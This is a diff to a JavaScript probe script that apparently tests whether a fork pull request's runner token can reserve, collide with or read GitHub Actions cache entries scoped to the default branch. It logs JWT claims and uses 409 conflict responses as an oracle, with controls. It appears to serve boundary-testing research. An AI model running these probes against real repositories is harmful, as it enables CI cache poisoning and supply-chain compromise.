@@ -47,6 +47,10 @@ function claims(tok, tag) {
       'repository_visibility', 'run_id', 'job_id', 'job_workflow_ref', 'trust_tier', 'plan_id', 'billing_owner_id']) {
       if (pl[k] !== undefined) L('@@JWT|' + tag + '|' + k + '|' + (typeof pl[k] === 'string' ? pl[k] : JSON.stringify(pl[k])));
     }
+    for (const k of Object.keys(pl)) {
+      if (['ac', 'scp', 'acsl', 'oidc_extra', 'run_type', 'runner_type', 'trust_tier', 'IdentityTypeClaim'].includes(k))
+        L('@@JWTALL|' + tag + '|' + k + '|' + (typeof pl[k] === 'string' ? pl[k] : JSON.stringify(pl[k])));
+    }
     return pl;
   } catch (e) { L('@@JWT|' + tag + '|decode-error|' + e.message); return {}; }
 }
@@ -150,6 +154,26 @@ const V1 = '0000000000000000000000000000000000000000000000000000000000000001';
     // every key is FIRST-TOUCHED here so the 409 conflict oracle cannot self-poison
     const K = (s) => 'cbfork-' + s + '-' + NONCE;
 
+    // 0. LEGACY v1 cache service - the second handler on the same object, still wired
+    //    into the runner env as ACTIONS_CACHE_URL. Probed FIRST so the annotation cap
+    //    cannot truncate it.
+    if (CACHEURL) {
+      const acc = { 'Authorization': 'Bearer ' + RT, 'Content-Type': 'application/json', 'Accept': 'application/json;api-version=6.0-preview.1' };
+      const lg = await req('GET', CACHEURL + '/_apis/artifactcache/cache?keys=' + encodeURIComponent(MAINKEY || 'x') + '&version=' + (MAINVER || V1), acc);
+      L('@@P|PR-legacy-get-mainkey|' + lg.status + '|' + flat(lg.body, 300));
+      const lr = await req('POST', CACHEURL + '/_apis/artifactcache/caches', acc, JSON.stringify({ key: K('legacy'), version: V1, cacheSize: 4 }));
+      L('@@P|PR-legacy-reserve|' + lr.status + '|' + flat(lr.body, 300));
+      let cid = null;
+      try { cid = JSON.parse(lr.body).cacheId; } catch (e) { }
+      if (cid) {
+        const lc = await req('POST', CACHEURL + '/_apis/artifactcache/caches/' + cid, acc, JSON.stringify({ size: 4 }));
+        L('@@P|PR-legacy-commit|' + lc.status + '|' + flat(lc.body, 300));
+      }
+      // legacy reserve carrying an explicit scope/ref field
+      const ls = await req('POST', CACHEURL + '/_apis/artifactcache/caches', acc,
+        JSON.stringify({ key: K('legacyscope'), version: V1, cacheSize: 4, scope: 'refs/heads/main', ref: 'refs/heads/main' }));
+      L('@@P|PR-legacy-reserve-scoped|' + ls.status + '|' + flat(ls.body, 300));
+    }
     // 1. plain create on a fresh key: which scope does the service pick?
     const r1 = await twirp('PR-create-plain', 'CacheService/CreateCacheEntry', { key: K('plain'), version: V1 });
     // 2. can ANY body field steer the scope? unknown fields, one axis at a time
@@ -176,6 +200,15 @@ const V1 = '0000000000000000000000000000000000000000000000000000000000000001';
       ['x-branch', { 'X-Actions-Ref': 'refs/heads/main' }],
     ]) {
       await twirp('PR-hdr-' + nm, 'CacheService/CreateCacheEntry', { key: K('h-' + nm), version: V1 }, { hdr });
+    }
+    // 4b. COLLISION DISCRIMINANT: reserve the default branch's OWN key at its OWN version.
+    //     A 409 here means this unprivileged ref shares a uniqueness scope with the default
+    //     branch. Control: an unrelated branch name returns 200 on the same call.
+    if (MAINKEY && MAINVER) {
+      await twirp('PR-COLLIDE-reserve-mainkey-mainver', 'CacheService/CreateCacheEntry', { key: MAINKEY, version: MAINVER });
+      await twirp('PR-COLLIDE-reserve-mainkey-uppercase', 'CacheService/CreateCacheEntry', { key: MAINKEY.toUpperCase(), version: MAINVER });
+      await twirp('PR-COLLIDE-read-mainkey-uppercase', 'CacheService/GetCacheEntryDownloadURL', { key: MAINKEY.toUpperCase(), version: MAINVER });
+      await twirp('PR-COLLIDE-read-mainver-uppercase', 'CacheService/GetCacheEntryDownloadURL', { key: MAINKEY, version: MAINVER.toUpperCase() });
     }
     // 5. read direction: documented as allowed (pr can restore from the base default branch)
     if (MAINKEY) {
@@ -205,12 +238,36 @@ const V1 = '0000000000000000000000000000000000000000000000000000000000000001';
     await report('pr'); // expected to fail 403 on a fork pr, captured as a control
   }
 
+  if (MODE === 'conflict') {
+    // ---- privileged default-branch 409 oracle -----------------------------------
+    // every key below was FIRST-TOUCHED by an unprivileged ref. 409 here means that
+    // reservation landed in THIS (default-branch) scope, i.e. the boundary broke.
+    // 200 here means it landed elsewhere, i.e. the boundary held.
+    await twirp('CFL-poscontrol-own-prior', 'CacheService/CreateCacheEntry', { key: 'cbmain-raw-' + NONCE, version: V1 });
+    await twirp('CFL-negcontrol-untouched', 'CacheService/CreateCacheEntry', { key: 'cbuntouched-' + NONCE + '-' + Date.now(), version: V1 });
+    for (const k of (PROBEKEY || '').split('|').filter(Boolean)) {
+      await twirp('CFL-' + k, 'CacheService/CreateCacheEntry', { key: k, version: V1 });
+    }
+    // legacy v1 service, same oracle
+    if (CACHEURL) {
+      for (const k of (PROBEKEY || '').split('|').filter(Boolean).slice(0, 4)) {
+        const lr = await req('POST', CACHEURL + '/_apis/artifactcache/caches',
+          { 'Authorization': 'Bearer ' + RT, 'Content-Type': 'application/json', 'Accept': 'application/json;api-version=6.0-preview.1' },
+          JSON.stringify({ key: k, version: V1 }));
+        L('@@P|CFLLEG-' + k + '|' + lr.status + '|' + flat(lr.body, 300));
+      }
+    }
+    await gh('CFL-list-caches', 'GET', '/repos/' + E.GITHUB_REPOSITORY + '/actions/caches?per_page=100');
+    await report('conflict');
+  }
+
   if (MODE === 'restore') {
     // ---- privileged default-branch read of what the fork wrote -------------------
+    const RV = MAINVER || V1;
     const probes = (PROBEKEY || '').split('|').filter(Boolean);
     for (const k of probes) {
-      await twirp('RST-exact-' + k, 'CacheService/GetCacheEntryDownloadURL', { key: k, version: V1 });
-      await twirp('RST-prefix-' + k, 'CacheService/GetCacheEntryDownloadURL', { key: 'zzz-miss-' + NONCE, restoreKeys: [k.slice(0, 14)], version: V1 });
+      await twirp('RST-exact-' + k, 'CacheService/GetCacheEntryDownloadURL', { key: k, version: RV });
+      await twirp('RST-prefix-' + k, 'CacheService/GetCacheEntryDownloadURL', { key: 'zzz-miss-' + NONCE, restoreKeys: [k.slice(0, 14)], version: RV });
     }
     if (MAINKEY) await twirp('RST-poscontrol-mainkey', 'CacheService/GetCacheEntryDownloadURL', { key: MAINKEY, version: MAINVER || V1 });
     await twirp('RST-negcontrol-never', 'CacheService/GetCacheEntryDownloadURL', { key: 'cbnever-' + NONCE, version: V1 });
